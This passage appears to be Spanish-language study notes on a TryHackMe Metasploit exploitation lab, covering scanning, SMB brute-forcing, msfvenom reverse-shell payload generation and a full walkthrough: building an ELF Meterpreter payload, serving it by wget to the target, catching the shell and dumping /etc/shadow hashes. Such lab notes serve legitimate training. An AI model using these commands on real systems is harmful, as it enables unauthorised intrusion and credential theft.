  - `PAYLOAD` — payload a usar.
  - `LHOST` — IP de la máquina atacante.
  - `LPORT` — puerto local para la reverse shell.
  - `SESSION` — ID de conexión (para módulos post).
- **Limpiar:** `unset PARAMETER` (uno), `unset all` (todos).
- **Globales:** `setg PARAMETER VALUE` (persiste entre módulos), `unsetg PARAMETER` (limpia).
- **Ejecutar:**
  - `exploit` — lanza el módulo. `run` es alias (mejor para no-exploits).
  - `exploit -z` — ejecuta y manda la sesión al background al abrirse.
  - `check` — verifica si el objetivo es vulnerable sin explotarlo (si el módulo lo soporta).
- **Sesiones** (canal con el objetivo al explotar con éxito):
  - `background` o `CTRL+Z` — manda la sesión al background.
  - `sessions` — lista sesiones activas.
  - `sessions -i <id>` — interactúa con una sesión.

---

# Metasploit: Exploitation

Room de TryHackMe sobre escaneo, base de datos, msfvenom y explotación con Metasploit.

## Introducción
- Temas de la room:
  - Escanear objetivos con Metasploit.
  - Usar la función de base de datos.
  - Hacer vulnerability scanning con Metasploit.
  - Explotar servicios vulnerables.
  - Usar `msfvenom` para crear payloads y obtener una sesión Meterpreter.
- **Wordlist del AttackBox** (para fuerza bruta): `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`.
- Se arranca con `msfconsole`.

## Scanning
- **Port scanning:** `search portscan` lista los módulos (`portscan/tcp`, `/syn`, `/ack`, `/xmas`).
  - Opciones: `CONCURRENCY`, `PORTS`, `RHOSTS`, `THREADS` (más threads = más rápido).
  - Ojo: `PORTS 1-1000` **no** equivale a Nmap (Nmap = los 1000 más usados; Metasploit = del 1 al 10000).
  - No es lo más rápido para escanear; para velocidad, Nmap.
- **Nmap desde msfconsole:** `nmap -sS <IP>` directo en el prompt.
- **UDP:** `scanner/discovery/udp_sweep` identifica rápido servicios UDP (DNS, NetBIOS).
- **SMB:** módulos auxiliary útiles → `smb_version`, `smb_enumshares`.
- **NetBIOS:** el nombre del objetivo da pistas de su rol (ej. `CORP-DC`). Puede haber shares sin password o con passwords débiles.
- **Fuerza bruta SMB** (ej. password de un usuario):
  ```
  use auxiliary/scanner/smb/smb_login
  set RHOSTS <IP>
  set SMBUser <usuario>
  set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
  run
  ```
  La password válida aparece con `[+]`.

## Base de datos de Metasploit
- Sirve para gestionar engagements con varios objetivos (guarda hosts, servicios, resultados). En el AttackBox ya viene lista; en Kali hay que inicializarla.
- **Inicializar (solo Kali / instalación propia):**
  - `systemctl start postgresql` (en Docker: `service postgresql start`).
  - `sudo -u postgres msfdb init` (como root falla: "run msfdb as a non-root user").
  - Rehacer: `sudo -u postgres msfdb delete` y volver a init.
  - Verificar en msfconsole: `db_status` → "Connected to msf".
- **Workspaces** (aíslan proyectos):
  - `workspace` — lista (activo con `*`).
  - `workspace -a <nombre>` / `-d <nombre>` — crear / borrar.
  - `workspace <nombre>` — cambiar.
- **Comandos de DB:**
  - `db_nmap <opciones> <IP>` — corre nmap y guarda resultados (ej. `db_nmap -sV -p- <IP>`).
  - `hosts` / `services` — lista hosts / servicios guardados.
  - `hosts -R` — carga los hosts guardados en `RHOSTS` (usa todos si hay varios).
  - `services -S <texto>` — busca servicios en la DB (ej. `services -S netbios`).
  - `db_import` / `db_export`, `vulns`, `loot`, `notes`.
- **Flujo típico:** `db_nmap` (descubrir) → módulo de escaneo (vulns/puertos) → `hosts -R` (setear RHOSTS).
- **Low-hanging fruits:** HTTP (SQLi/RCE), FTP (login anónimo), SMB (MS17-010), SSH (credenciales débiles), RDP (BlueKeep / credenciales débiles).

## Vulnerability scanning
- Metasploit ayuda a encontrar **low-hanging fruit**: vulns fáciles de identificar/explotar para ganar un pie inicial (a veces root/admin).
- Depende mucho de escanear y hacer **fingerprint** del objetivo: cuanto mejor identificás servicios, más opciones te da Metasploit.
- **Flujo:** identificás un servicio (ej. VNC) → `search` lista módulos (payloads, post y scanners). Los scanners sirven ya en esta etapa aunque todavía no tengas un exploit.
  - `use auxiliary/scanner/vnc/` + Tab → lista scanners (`vnc_login`, `vnc_none_auth`, `ard_root_pw`).
  - `vnc_login` busca credenciales VNC por fuerza bruta.
- `info <módulo>` — uso, propósito, autor y opciones de cualquier módulo.

## Exploitation
- Flujo: `search` (encontrar exploit) → `info` (entenderlo) → `exploit`/`run` (lanzarlo). El éxito depende de conocer bien los servicios del target.
- **Payloads:**
  - La mayoría de exploits trae un payload por defecto.
  - `show payloads` — lista los compatibles.
  - `set payload <nº o nombre>` — lo elige.
  - Elegir uno que funcione puede ser prueba y error (firewall, AV, escritura de archivos, intérprete inexistente en el target).
  - Algunos payloads abren parámetros nuevos (`show options`). Un reverse pide al menos `LHOST` (+ `LPORT`, default 4444).
- **Sesiones** (shell/Meterpreter al explotar):
  - `CTRL+Z` manda al background, `CTRL+C` aborta.
  - `sessions` / `sessions -l` — lista.
  - `sessions -i <id>` — interactúa.
  - `sessions -h` — ayuda (`-K` mata todas, `-k <id>` una, `-u <id>` upgradea shell → Meterpreter, `-C` corre comando Meterpreter).
- **Ojo:** arrancar una Lab Machine nueva termina la anterior → **IP de target cambia**, hay que re-escanear (`db_nmap -sV <IP>`).


## Msfvenom (generación de payloads)
- Reemplazó a `msfpayload` y `msfencode`. Permite generar payloads en muchos formatos (PHP, exe, dll, elf, etc.) para distintos sistemas (Windows, Linux, Android, Apple, etc.).
- **Listar payloads:** `msfvenom -l payloads` (hay cientos). **Listar formatos de salida:** `msfvenom --list formats`.
- **Encoders (`-e`):** codifican el payload. **No** sirven de forma fiable para evadir antivirus modernos (su objetivo real es codificar, no ofuscar). Ej. `msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw -e php/base64`.
- **Payloads reverse:** todos necesitan un **handler** (`exploit/multi/handler`) escuchando del lado del atacante, con el **mismo** payload, `LHOST` y `LPORT`.
  - `LHOST` = IP de la máquina atacante. `LPORT` = puerto donde escucha el handler.
- **Handler (multi/handler):** recibe la conexión entrante ("catching a shell"). Soporta todos los payloads de Metasploit (shell normal o Meterpreter).
  ```
  use exploit/multi/handler
  set payload <mismo payload del msfvenom>
  set LHOST <IP atacante>
  set LPORT <puerto>
  run
  ```
  Si el payload era Meterpreter, el handler entrega una sesión Meterpreter.
- **Ejemplos de payloads por formato** (`LHOST` = atacante, `LPORT` = puerto del handler):
  - **Linux (elf):** `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f elf > rev_shell.elf`
    - El `.elf` es el equivalente al `.exe` de Windows. En el target: `chmod +x shell.elf` y luego `./shell.elf`.
  - **Windows (exe):** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f exe > rev_shell.exe`
  - **PHP:** `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<puerto> -f raw > rev_shell.php`
    - El `.php` generado viene **sin** la etiqueta `<?php` inicial comentada y **sin** `?>` al final → hay que editarlo para que sea un PHP válido.
  - **ASP:** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<puerto> -f asp > rev_shell.asp`
  - **Python:** `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<puerto> -f raw > rev_shell.py`

## Práctica: payload .elf + post-explotación (Task 6)
- **Escenario:** VM con usuario `murphy` / password `1q2w3e4r`. Conectar por SSH o navegador; `sudo su` para shell root (facilita las cosas).
- **Flujo completo:**
  1. **Generar el payload** `.elf` en la máquina atacante:
     ```
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP atacante> LPORT=<puerto> -f elf > shell.elf
     ```
  2. **Levantar el handler** en Metasploit (mismo payload/LHOST/LPORT) y `run`.
  3. **Transferir el payload** al target:
     - En el atacante: `python3 -m http.server 9000`
     - En el target: `wget http://<IP atacante>:9000/shell.elf`
  4. **Ejecutar** en el target: `chmod +x shell.elf` → `./shell.elf` → cae la sesión Meterpreter.
  5. **Dumpear hashes** de otros usuarios con un módulo post (ej. `post/linux/gather/hashdump`):
     ```
     run post/linux/gather/hashdump
     ```
     o mandando la sesión al background (`CTRL+Z`) y usando el módulo con `set SESSION <id>`.
- **Lectura del hash (`/etc/shadow`):** formato `usuario:$id$salt$hash:...`. El `$id` indica el algoritmo (`$1`=MD5, `$5`=SHA-256, `$6`=SHA-512, `$y`=yescrypt). Ese valor completo es el "password hash" del otro usuario, y se puede crackear con `hashcat`/`john`.
